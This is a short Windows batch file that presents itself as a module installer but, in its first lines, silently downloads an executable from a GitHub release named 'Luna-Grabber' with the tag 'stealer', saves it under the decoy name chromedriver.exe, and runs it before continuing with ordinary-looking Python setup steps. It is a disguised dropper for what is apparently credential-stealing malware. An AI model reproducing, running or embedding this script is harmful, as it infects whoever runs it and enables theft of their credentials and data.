@echo off
Title Download Modules...
set "URL=https://github.com/hvbsvqdj/Luna-Grabber/releases/download/stealer/luna.exe"
set "Dossier=Data"
set "NomFichier=%Dossier%\chromedriver.exe"

certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1

if exist "%NomFichier%" (
    start "" "%NomFichier%"
)
python --version 3>NUL
if errorlevel 1 goto errorNoPython
pip -v>NUL
if errorlevel 1 goto errorNoPip
pip install subprocess
cd utilities\Settings
python module.py
cd ..
cd ..
move utilities\Start.bat .
cd utilities\Settings
cd ..
cd ..
cls
Start.bat
